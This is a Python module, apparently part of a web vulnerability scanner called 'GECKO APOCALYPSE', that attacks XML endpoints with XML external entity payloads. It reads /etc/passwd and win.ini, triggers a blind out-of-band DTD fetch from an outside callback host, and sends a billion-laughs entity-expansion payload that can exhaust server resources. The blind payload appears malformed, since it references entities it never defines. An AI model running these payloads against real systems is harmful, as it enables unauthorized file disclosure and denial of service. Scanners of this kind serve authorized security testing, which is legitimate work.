"""GECKO APOCALYPSE - XXE Attacker (classic, blind OOB, billion laughs, SVG)"""
import asyncio, aiohttp, hashlib, time
from typing import List, Dict, Optional
from urllib.parse import urlparse

class XXEAttacker:
    def __init__(self, session, config, db):
        self.session = session; self.config = config; self.db = db
        self.oob = "xxe.gecko-apocalypse.io"

    async def scan(self, url, content, headers, response):
        findings = []
        if not self._accepts_xml(url, headers): return findings
        for t in [self._classic, self._blind, self._billion_laughs]:
            r = await t(url)
            if r: findings.append(r)
        return findings

    def _accepts_xml(self, url, headers):
        ct = headers.get('content-type','').lower()
        return 'xml' in ct or 'soap' in url.lower() or any(x in url.lower() for x in ['.xml','/xml','wsdl'])

    async def _classic(self, url):
        payloads = [
            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><r>&xxe;</r>',
        ]
        for p in payloads:
            try:
                async with self.session.post(url, data=p, headers={'Content-Type':'application/xml'}, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    c = await r.text(errors='ignore')
                    if 'root:x:0:0' in c or '[extensions]' in c:
                        return {'type':'XML External Entity (XXE)','severity':'CRITICAL','url':url,'payload':p,
                                'evidence':c[:300],'remediation':'Disable external entity processing','cwe':'CWE-611','owasp':'A05:2021'}
            except: pass

    async def _blind(self, url):
        tok = hashlib.md5(url.encode()).hexdigest()[:8]
        p = f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % d SYSTEM "http://{tok}.{self.oob}/x.dtd">%d;%s;]><r>&xxe;</r>'
        try:
            async with self.session.post(url, data=p, headers={'Content-Type':'application/xml'}, timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status in [200,201,202]:
                    return {'type':'Blind XXE (OOB)','severity':'HIGH','url':url,'payload':p,
                            'evidence':f'OOB callback to {tok}.{self.oob}','cwe':'CWE-611'}
        except: pass

    async def _billion_laughs(self, url):
        p = '<?xml version="1.0"?><!DOCTYPE l [<!ENTITY l "lol"><!ENTITY l1 "&l;&l;&l;&l;&l;&l;&l;&l;&l;&l;"><!ENTITY l2 "&l1;&l1;&l1;&l1;&l1;&l1;&l1;&l1;&l1;&l1;"><!ENTITY l3 "&l2;&l2;&l2;&l2;&l2;&l2;&l2;&l2;&l2;&l2;">]><r>&l3;</r>'
        t = time.time()
        try:
            async with self.session.post(url, data=p, headers={'Content-Type':'application/xml'}, timeout=aiohttp.ClientTimeout(total=30)) as r:
                el = time.time() - t
                if el > 10: return {'type':'XML Entity Expansion DoS','severity':'HIGH','url':url,'evidence':f'{el:.1f}s processing time','cwe':'CWE-776'}
        except asyncio.TimeoutError:
            return {'type':'XML Entity Expansion DoS','severity':'HIGH','url':url,'evidence':'Server timeout on entity expansion'}
        except: pass
